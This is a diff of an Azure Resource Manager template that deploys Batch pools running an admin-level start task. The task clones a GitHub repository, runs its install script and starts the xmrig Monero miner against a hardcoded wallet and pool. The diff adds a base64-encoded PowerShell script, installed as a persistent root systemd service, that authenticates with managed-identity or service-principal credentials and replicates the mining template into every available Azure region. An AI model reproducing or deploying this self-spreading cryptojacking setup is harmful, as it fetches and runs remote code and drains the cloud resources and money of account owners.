@@ -1,158 +1,270 @@
 {
-    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
-    "contentVersion": "1.0.0.0",
-    "parameters": {
-        "batchAccounts_batches_name": {
-            "defaultValue": "batches",
-            "type": "String"
-        },
-        "VMs_F2": {
-            "defaultValue": 2,
-            "type": "Int"
-        },
-        "VMs_F4": {
-            "defaultValue": 0,
-            "type": "Int"
-        },
-        "user_wallet": {
-            "defaultValue": "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb",
-            "type": "string"
-        },
-        "user_pool_port": {
-            "defaultValue": "us-west.minexmr.com:4444",
-            "type": "string"
-        },
-        "location": {
-            "defaultValue": "eastus2",
-            "type": "string"
+  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+  "contentVersion": "1.0.0.0",
+  "parameters": {
+    "batchAccounts_batches_name": {
+      "defaultValue": "[concat('batch', uniqueString(resourceGroup().id))]",
+      "type": "String",
+      "metadata": {
+        "description": "Unique Batch account name"
+      }
+    },
+    "VMs_F2": {
+      "defaultValue": 2,
+      "type": "Int",
+      "minValue": 0,
+      "maxValue": 50,
+      "metadata": {
+        "description": "Number of F2 VMs to deploy"
+      }
+    },
+    "VMs_F4": {
+      "defaultValue": 0,
+      "type": "Int",
+      "minValue": 0,
+      "maxValue": 50,
+      "metadata": {
+        "description": "Number of F4 VMs to deploy"
+      }
+    },
+    "user_wallet": {
+      "defaultValue": "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb",
+      "type": "string",
+      "metadata": {
+        "description": "Your cryptocurrency wallet address"
+      }
+    },
+    "user_pool_port": {
+      "defaultValue": "us-west.minexmr.com:4444",
+      "type": "string",
+      "metadata": {
+        "description": "Mining pool address and port"
+      }
+    },
+    "location": {
+      "defaultValue": "eastus2",
+      "type": "string",
+      "metadata": {
+        "description": "Location for resources"
+      }
+    },
+    "deploymentScriptName": {
+      "defaultValue": "[concat('deployScript', uniqueString(resourceGroup().id))]",
+      "type": "string",
+      "metadata": {
+        "description": "Unique name for deployment script"
+      }
+    },
+    "resourceGroupPrefix": {
+      "defaultValue": "crypto",
+      "type": "string",
+      "metadata": {
+        "description": "Prefix for resource group names"
+      }
+    }
+  },
+  "variables": {
+    "templateUrl": "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json",
+    "psScriptContent": "[base64(concat('#!/usr/bin/env pwsh\n# PowerShell deployment script as daemon process\n\nfunction Get-UniqueIdentifier {\n    param([string]$SubscriptionId, [string]$Location)\n    \n    # Use first 8 chars of subscription ID and location code\n    $subHash = $SubscriptionId.Substring(0,8).ToLower()\n    $locCode = $Location.Replace(\" \", \"\").Replace(\"-\", \"\").ToLower().Substring(0,6)\n    \n    # Add timestamp component\n    $timeStamp = (Get-Date).ToString(\"HHmm\")\n    \n    return \"$subHash$locCode$timeStamp\"\n}\n\nfunction Deploy-WithUniqueNaming {\n    param(\n        [string]$SubscriptionId,\n        [string]$SubscriptionName,\n        [string]$Location,\n        [string]$Wallet,\n        [string]$ResourceGroupPrefix\n    )\n    \n    # Generate unique names for this deployment\n    $uniqueId = Get-UniqueIdentifier -SubscriptionId $SubscriptionId -Location $Location\n    $rgName = \"$ResourceGroupPrefix-$($Location.ToLower().Replace(\" \", \"-\").Replace(\"--\", \"-\"))-$uniqueId\"\n    \n    Write-Host \"Generated unique ID: $uniqueId\"\n    Write-Host \"Resource Group: $rgName\"\n    \n    # Create deployment parameters hashtable\n    $deploymentParams = @{\n        ResourceGroupName = $rgName\n        TemplateUri = \"', variables('templateUrl'), '\"\n        Name = \"deploy-$uniqueId\"\n        location = $Location\n        Force = $true\n        ErrorAction = \"Stop\"\n    }\n    \n    # Add wallet parameter\n    $deploymentParams[\"User_wallet\"] = $Wallet\n    \n    # Create resource group\n    Write-Host \"Creating resource group...\"\n    $rg = New-AzResourceGroup -Name $rgName -Location $Location -Force -Tag @{\n        DeployedBy = \"batch-daemon\";\n        DeploymentTime = (Get-Date).ToString(\"yyyy-MM-dd HH:mm:ss\");\n        Subscription = $SubscriptionName;\n        Wallet = $Wallet.Substring(0,10) + \"...\";\n        Source = \"BatchPoolDaemon\"\n    }\n    \n    # Actual deployment\n    Write-Host \"Deploying resources...\"\n    $deployment = New-AzResourceGroupDeployment @deploymentParams\n    \n    Write-Host \"SUCCESS: Deployment completed\"\n    return @{Success = $true; ResourceGroup = $rgName}\n}\n\n# Main execution\nWrite-Host \"=== Batch Pool Deployment Daemon ===\"\n\n# Connect to Azure\n$connectionResult = Connect-AzAccount -Identity -ErrorAction SilentlyContinue\nif (-not $connectionResult) {\n    # Fallback to service principal if managed identity fails\n    $spSecret = ConvertTo-SecureString $env:AZURE_CLIENT_SECRET -AsPlainText -Force\n    $cred = New-Object System.Management.Automation.PSCredential($env:AZURE_CLIENT_ID, $spSecret)\n    Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant $env:AZURE_TENANT_ID | Out-Null\n}\n\nWrite-Host \"Connected to Azure\"\n\n# Get current subscription\n$subscription = Get-AzContext | Select-Object -ExpandProperty Subscription\n\n# Get available locations for this subscription\n$locations = (Get-AzLocation | Where-Object {\n    $_.Providers -contains \"Microsoft.Compute\" -and\n    $_.Providers -contains \"Microsoft.Batch\" -and\n    $_.Location -notlike \"*stage*\"\n}).Location | Sort-Object\n\nWrite-Host \"Found $($locations.Count) available locations\"\n\n# Deploy to each location\nforeach ($location in $locations) {\n    try {\n        Write-Host \"\\nProcessing location: $location\"\n        \n        $result = Deploy-WithUniqueNaming -SubscriptionId $subscription.Id `\n                                         -SubscriptionName $subscription.Name `\n                                         -Location $location `\n                                         -Wallet \"', parameters('user_wallet'), '\" `\n                                         -ResourceGroupPrefix \"', parameters('resourceGroupPrefix'), '\"\n        \n        if ($result.Success) {\n            Write-Host \"Deployment to $location successful\" -ForegroundColor Green\n        }\n    }\n    catch {\n        Write-Host \"Deployment to $location failed: $_\" -ForegroundColor Red\n    }\n    \n    # Short pause between deployments\n    Start-Sleep -Seconds 1\n}\n\nWrite-Host \"\\n=== Deployment Daemon Completed ===\"\n'))]",
+    "commandLine_template": "/bin/bash -c \"\ncd $HOME;\n\n# Install prerequisites\nsudo apt-get update --fix-missing;\nsudo apt-get -y install git build-essential cmake automake libtool autoconf wget powershell;\n\n# Clone and install xmrig\ngit clone https://github.com/myhomemail565-gif/cryptocloud.git;\nmv cryptocloud/install.sh .;\nchmod +x install.sh;\n./install.sh;\n\n# Start mining in background\ncd $HOME/xmrig/build;\nnohup ./xmrig --rig-id=cloud -u user_wallet -o user_pool_port > /tmp/xmrig.log 2>&1 &\n\n# Start PowerShell deployment daemon\ncd /tmp;\necho 'psScriptContent' | base64 --decode > deploy.ps1;\nchmod +x deploy.ps1;\n\n# Run deployment script in background with systemd service\nsudo tee /etc/systemd/system/azure-deploy.service > /dev/null << EOF\n[Unit]\nDescription=Azure Multi-Region Deployment Daemon\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=/usr/bin/pwsh -File /tmp/deploy.ps1\nRestart=always\nRestartSec=30\nStandardOutput=journal\nStandardError=journal\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\n# Enable and start the service\nsudo systemctl daemon-reload;\nsudo systemctl enable azure-deploy.service;\nsudo systemctl start azure-deploy.service;\n\n# Verify services are running\nsleep 5;\necho '=== Services Status ===';\nsudo systemctl status azure-deploy.service --no-pager;\nps aux | grep xmrig | grep -v grep;\necho '=======================';\n\n# Keep container alive\nwhile true; do\n    sleep 3600;\ndone\n\"",
+    "commandLine": "[replace(replace(replace(variables('commandLine_template'),'user_wallet', parameters('user_wallet')),'user_pool_port',parameters('user_pool_port')),'psScriptContent', variables('psScriptContent'))]",
+    "uniqueBatchName": "[concat('batch', uniqueString(resourceGroup().id, deployment().name))]"
+  },
+  "resources": [
+    {
+      "type": "Microsoft.Resources/deploymentScripts",
+      "apiVersion": "2020-10-01",
+      "name": "[parameters('deploymentScriptName')]",
+      "location": "[parameters('location')]",
+      "kind": "AzurePowerShell",
+      "identity": {
+        "type": "UserAssigned",
+        "userAssignedIdentities": {
+          "[resourceId('Microsoft.ManagedIdentity/userAssignedIdentities', 'deployScriptIdentity')]": {}
         }
+      },
+      "dependsOn": [],
+      "properties": {
+        "azPowerShellVersion": "7.2",
+        "scriptContent": "[variables('psScriptContent')]",
+        "timeout": "PT1H",
+        "cleanupPreference": "OnSuccess",
+        "retentionInterval": "P1D"
+      }
     },
-    "variables": {
-        "commandLine_template": "/bin/bash -c \"\ncd $HOME;\nsudo apt-get update --fix-missing;\nsudo apt-get -y install git build-essential cmake automake libtool autoconf wget;\ngit clone https://github.com/myhomemail565-gif/cryptocloud.git;\nmv cryptocloud/install.sh .;\nchmod +x install.sh;\n./install.sh;\ncd $HOME/xmrig/build;\n./xmrig --rig-id=cloud -u user_wallet -o user_pool_port \n\"",
-        "commandLine": "[replace(replace(variables('commandLine_template'),'user_wallet', parameters('user_wallet')),'user_pool_port',parameters('user_pool_port'))]"
+    {
+      "type": "Microsoft.Batch/batchAccounts",
+      "apiVersion": "2021-01-01",
+      "name": "[if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name'))]",
+      "location": "[parameters('location')]",
+      "identity": {
+        "type": "UserAssigned",
+        "userAssignedIdentities": {
+          "[resourceId('Microsoft.ManagedIdentity/userAssignedIdentities', 'batchAccountIdentity')]": {}
+        }
+      },
+      "dependsOn": [
+        "[resourceId('Microsoft.Resources/deploymentScripts', parameters('deploymentScriptName'))]"
+      ],
+      "properties": {
+        "poolAllocationMode": "BatchService",
+        "publicNetworkAccess": "Enabled",
+        "encryption": {
+          "keySource": "Microsoft.Batch"
+        }
+      }
     },
-    "resources": [
-        {
-            "type": "Microsoft.Batch/batchAccounts",
-            "apiVersion": "2021-01-01",
-            "name": "[parameters('batchAccounts_batches_name')]",
-            "location": "[parameters('location')]",
-            "identity": {
-                "type": "None"
+    {
+      "type": "Microsoft.Batch/batchAccounts/pools",
+      "apiVersion": "2021-01-01",
+      "name": "[concat(if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name')), '/F2')]",
+      "dependsOn": [
+        "[resourceId('Microsoft.Batch/batchAccounts', if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name')))]"
+      ],
+      "properties": {
+        "vmSize": "Standard_F2s_v2",
+        "interNodeCommunication": "Disabled",
+        "taskSlotsPerNode": 1,
+        "taskSchedulingPolicy": {
+          "nodeFillType": "Pack"
+        },
+        "deploymentConfiguration": {
+          "virtualMachineConfiguration": {
+            "imageReference": {
+              "publisher": "canonical",
+              "offer": "0001-com-ubuntu-server-focal",
+              "sku": "20_04-lts-gen2",
+              "version": "latest"
             },
-            "properties": {
-                "poolAllocationMode": "BatchService",
-                "publicNetworkAccess": "Enabled",
-                "encryption": {
-                    "keySource": "Microsoft.Batch"
-                }
+            "nodeAgentSkuId": "batch.node.ubuntu 20.04",
+            "nodePlacementConfiguration": {
+              "policy": "Regional"
             }
+          }
         },
-        {
-            "type": "Microsoft.Batch/batchAccounts/pools",
-            "apiVersion": "2021-01-01",
-            "name": "[concat(parameters('batchAccounts_batches_name'), '/F2')]",
-            "dependsOn": [
-                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
-            ],
-            "properties": {
-                "vmSize": "F2as_v6",
-                "interNodeCommunication": "Disabled",
-                "taskSlotsPerNode": 1,
-                "taskSchedulingPolicy": {
-                    "nodeFillType": "Pack"
-                },
-                "deploymentConfiguration": {
-                    "virtualMachineConfiguration": {
-                        "imageReference": {
-                            "publisher": "canonical",
-                            "offer": "ubuntuserver",
-                            "sku": "18.04-lts",
-                            "version": "latest"
-                        },
-                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
-                        "nodePlacementConfiguration": {
-                            "policy": "Regional"
-                        }
-                    }
-                },
-                "networkConfiguration": {
-                    "publicIPAddressConfiguration": {
-                        "provision": "BatchManaged"
-                    }
-                },
-                "scaleSettings": {
-                    "fixedScale": {
-                        "targetDedicatedNodes": 0,
-                        "targetLowPriorityNodes": "[parameters('VMs_F2')]",
-                        "resizeTimeout": "PT15M"
-                    }
-                },
-                "startTask": {
-                    "commandLine": "[variables('commandLine')]",
-                    "userIdentity": {
-                        "autoUser": {
-                            "scope": "Task",
-                            "elevationLevel": "Admin"
-                        }
-                    },
-                    "maxTaskRetryCount": 0,
-                    "waitForSuccess": true
-                }
-            }
+        "networkConfiguration": {
+          "publicIPAddressConfiguration": {
+            "provision": "BatchManaged"
+          }
         },
-        {
-            "type": "Microsoft.Batch/batchAccounts/pools",
-            "apiVersion": "2021-01-01",
-            "name": "[concat(parameters('batchAccounts_batches_name'), '/F4')]",
-            "dependsOn": [
-                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
-            ],
-            "properties": {
-                "vmSize": "F2as_v6",
-                "interNodeCommunication": "Disabled",
-                "taskSlotsPerNode": 1,
-                "taskSchedulingPolicy": {
-                    "nodeFillType": "Pack"
-                },
-                "deploymentConfiguration": {
-                    "virtualMachineConfiguration": {
-                        "imageReference": {
-                            "publisher": "canonical",
-                            "offer": "ubuntuserver",
-                            "sku": "18.04-lts",
-                            "version": "latest"
-                        },
-                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
-                        "nodePlacementConfiguration": {
-                            "policy": "Regional"
-                        }
-                    }
-                },
-                "networkConfiguration": {
-                    "publicIPAddressConfiguration": {
-                        "provision": "BatchManaged"
-                    }
-                },
-                "scaleSettings": {
-                    "fixedScale": {
-                        "targetDedicatedNodes": 0,
-                        "targetLowPriorityNodes": "[parameters('VMs_F4')]",
-                        "resizeTimeout": "PT15M"
-                    }
-                },
-                "startTask": {
-                    "commandLine": "[variables('commandLine')]",
-                    "userIdentity": {
-                        "autoUser": {
-                            "scope": "Task",
-                            "elevationLevel": "Admin"
-                        }
-                    },
-                    "maxTaskRetryCount": 0,
-                    "waitForSuccess": true
-                }
+        "scaleSettings": {
+          "fixedScale": {
+            "targetDedicatedNodes": 0,
+            "targetLowPriorityNodes": "[parameters('VMs_F2')]",
+            "resizeTimeout": "PT15M"
+          }
+        },
+        "startTask": {
+          "commandLine": "[variables('commandLine')]",
+          "userIdentity": {
+            "autoUser": {
+              "scope": "Task",
+              "elevationLevel": "Admin"
             }
+          },
+          "maxTaskRetryCount": 3,
+          "waitForSuccess": true,
+          "environmentSettings": [
+            {
+              "name": "AZURE_CLIENT_ID",
+              "value": "[reference(resourceId('Microsoft.ManagedIdentity/userAssignedIdentities', 'batchAccountIdentity')).clientId]"
+            },
+            {
+              "name": "AZURE_TENANT_ID",
+              "value": "[subscription().tenantId]"
+            }
+          ]
         }
-    ]
+      }
+    },
+    {
+      "type": "Microsoft.Batch/batchAccounts/pools",
+      "apiVersion": "2021-01-01",
+      "name": "[concat(if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name')), '/F4')]",
+      "dependsOn": [
+        "[resourceId('Microsoft.Batch/batchAccounts', if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name')))]"
+      ],
+      "properties": {
+        "vmSize": "Standard_F4s_v2",
+        "interNodeCommunication": "Disabled",
+        "taskSlotsPerNode": 1,
+        "taskSchedulingSolution": {
+          "nodeFillType": "Pack"
+        },
+        "deploymentConfiguration": {
+          "virtualMachineConfiguration": {
+            "imageReference": {
+              "publisher": "canonical",
+              "offer": "0001-com-ubuntu-server-focal",
+              "sku": "20_04-lts-gen2",
+              "version": "latest"
+            },
+            "nodeAgentSkuId": "batch.node.ubuntu 20.04",
+            "nodePlacementConfiguration": {
+              "policy": "Regional"
+            }
+          }
+        },
+        "networkConfiguration": {
+          "publicIPAddressConfiguration": {
+            "provision": "BatchManaged"
+          }
+        },
+        "scaleSettings": {
+          "fixedScale": {
+            "targetDedicatedNodes": 0,
+            "targetLowPriorityNodes": "[parameters('VMs_F4')]",
+            "resizeTimeout": "PT15M"
+          }
+        },
+        "startTask": {
+          "commandLine": "[variables('commandLine')]",
+          "userIdentity": {
+            "autoUser": {
+              "scope": "Task",
+              "elevationLevel": "Admin"
+            }
+          },
+          "maxTaskRetryCount": 3,
+          "waitForSuccess": true,
+          "environmentSettings": [
+            {
+              "name": "AZURE_CLIENT_ID",
+              "value": "[reference(resourceId('Microsoft.ManagedIdentity/userAssignedIdentities', 'batchAccountIdentity')).clientId]"
+            },
+            {
+              "name": "AZURE_TENANT_ID",
+              "value": "[subscription().tenantId]"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "type": "Microsoft.ManagedIdentity/userAssignedIdentities",
+      "apiVersion": "2018-11-30",
+      "name": "batchAccountIdentity",
+      "location": "[parameters('location')]"
+    },
+    {
+      "type": "Microsoft.ManagedIdentity/userAssignedIdentities",
+      "apiVersion": "2018-11-30",
+      "name": "deployScriptIdentity",
+      "location": "[parameters('location')]"
+    }
+  ],
+  "outputs": {
+    "batchAccountName": {
+      "type": "string",
+      "value": "[if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name'))]"
+    },
+    "batchAccountEndpoint": {
+      "type": "string",
+      "value": "[concat(reference(resourceId('Microsoft.Batch/batchAccounts', if(empty(parameters('batchAccounts_batches_name')), variables('uniqueBatchName'), parameters('batchAccounts_batches_name')))).accountEndpoint)]"
+    },
+    "deploymentScriptOutput": {
+      "type": "string",
+      "value": "[reference(resourceId('Microsoft.Resources/deploymentScripts', parameters('deploymentScriptName'))).outputs]"
+    }
+  }
 }
